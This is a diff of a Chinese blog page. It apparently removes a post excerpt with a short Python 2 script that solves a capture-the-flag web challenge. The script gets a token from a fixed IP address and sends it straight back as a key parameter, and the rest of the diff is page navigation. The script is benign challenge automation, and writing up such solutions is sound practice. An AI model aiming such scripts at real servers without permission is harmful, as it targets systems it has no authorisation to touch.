-<p>写个脚本多运行几次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;http://123.206.31.85:10020/&quot;</span><br><span class="line">r = requests.session()</span><br><span class="line">text = r.get(url).content</span><br><span class="line"></span><br><span class="line">key = re.findall(r&quot;[0-9a-z]+&quot;,text)[0]</span><br><span class="line">url1 = url + &quot;?key=&quot; + key</span><br><span class="line">res = r.get(url1).content</span><br><span class="line">print res</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/20/lun web/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
